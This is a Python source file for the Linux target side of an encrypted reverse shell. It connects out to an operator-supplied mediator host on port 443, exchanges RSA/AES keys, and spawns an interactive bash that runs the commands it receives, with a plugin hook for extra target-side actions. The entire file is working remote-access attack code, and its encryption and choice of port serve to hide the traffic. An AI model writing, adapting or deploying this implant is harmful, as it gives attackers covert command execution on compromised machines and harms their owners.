#/usr/bin/python3
"""
Program: linuxTarget.py
Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell operator client connection
"""

import argparse
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import inspect
import os
import pathlib
try:
    from . import plugins
except ImportError:
    import plugins
import socket
import subprocess
from sys import exit
import threading


class LinuxRShell:
    def __init__(self, mediatorHost="", connectionKey="#!ConnectionKey_CHANGE_ME!!!"):
        self.connectionKey = connectionKey
        self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.plugins = self.loadPlugins()
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.mediatorHost = mediatorHost
        # self.cipherKey defined in LinuxRShell.run()

    def loadPlugins(self):
        commandClasses = inspect.getmembers(plugins, inspect.isclass)
        commandClasses.pop(0)
        externalCommands = dict()
        for className, commandClass in commandClasses:
            externalCommands[commandClass.name()] = commandClass.linuxTarget
        return externalCommands

    def tryPlugin(self, commandLine):
        argv = commandLine.split()
        if not argv:
            # newline sent -- not a plugin
            return False
        command = argv[0]
        try:
            self.plugins[command](argv, self.handler, self.cipherKey)
            return True
        except KeyError:
            # command not in plugins
            return False

    def readCommands(self, bash):
        while True:
            nonce = self.handler.recv(16)
            tag = self.handler.recv(16)
            ciphertext = self.handler.recv(1024)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
            command = cipher.decrypt(ciphertext)
            if len(command) > 0:
                # check if command is a plugin -- if so run plugin's linux target code
                plugin = self.tryPlugin(command.decode())
                if plugin:
                    # print new prompt
                    bash.stdin.write(b'\n')
                    bash.stdin.flush()
                else:
                    # not a plugin -- send command to shell
                    bash.stdin.write(command)
                    bash.stdin.flush()
                    # change working directory if cd command
                    if "cd " in command.decode() or "cd\n" in command.decode():
                        command = command.decode().strip()
                        if len(command) == 2:
                            p = pathlib.Path("~")
                        else:
                            p = pathlib.Path(command[3:])
                        try:
                            print(f"Changing directory to {p.resolve()}")
                            os.chdir(p.resolve())
                        except Exception:
                            # not a directory -- let shell output error message
                            pass

    def sendResponses(self, bash):
        while True:
            ch = bash.stdout.read(1)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(ch)
            self.handler.sendall(nonce)
            self.handler.sendall(tag)
            self.handler.sendall(ciphertext)

    def keyExchange(self):
        try:
            pemPubKey = self.handler.recv(1024)
            pubKey = RSA.import_key(pemPubKey)
        except ValueError:
            # timeout or duplicate key -- connection closed by server
            # change key or try again soon
            exit(1)
        key = get_random_bytes(32)
        cipher = PKCS1_OAEP.new(pubKey)
        message = cipher.encrypt(key)
        self.handler.sendall(message)
        return key

    def connect(self, mediatorHost):
        self.handler.connect((socket.gethostbyname(mediatorHost), 443))
        self.handler.sendall(self.connectionKey.encode())
        verification = self.handler.recv(1024)

    def run(self):
        self.connect(self.mediatorHost)
        self.cipherKey = self.keyExchange()
        bash = subprocess.Popen(["/bin/bash", "-i"],
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=self.readCommands, args=[bash])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = threading.Thread(target=self.sendResponses, args=[bash])
        p2s_thread.daemon = True
        p2s_thread.start()
        try:
            bash.wait()
        except KeyboardInterrupt:
            self.handler.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                        default="example.com")
    args = parser.parse_args()
    if args.serverAddr == "example.com":
        exit(1)
    if args.connectionKey:
        rShell = LinuxRShell(mediatorHost=args.serverAddr, connectionKey=args.connectionKey)
    else:
        rShell = LinuxRShell(mediatorHost=args.serverAddr)
    rShell.run()

